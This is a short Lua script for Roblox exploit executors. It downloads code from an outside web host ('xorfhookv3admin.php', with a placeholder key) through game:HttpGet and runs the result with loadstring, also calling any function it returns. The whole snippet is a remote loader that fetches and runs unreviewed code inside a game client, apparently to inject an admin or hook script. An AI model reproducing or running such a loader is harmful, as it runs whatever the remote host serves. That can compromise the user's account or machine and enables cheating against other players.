local url = "https://domatitebg.ct.ws/scripts/xorfhookv3admin.php?key=YOUR_SECRET_KEY_CHANGE_THIS"

-- Method 1: Using loadstring (older executors)
local success, err = pcall(function()
    local scriptFunc = loadstring(game:HttpGet(url, true))
    if scriptFunc then
        local result = scriptFunc()
        if typeof(result) == "function" then
            result()
        end
    else
        warn("loadstring returned nil - check URL/User-Agent")
    end
end)

if not success then
    warn("❌ Error: " .. tostring(err))
end
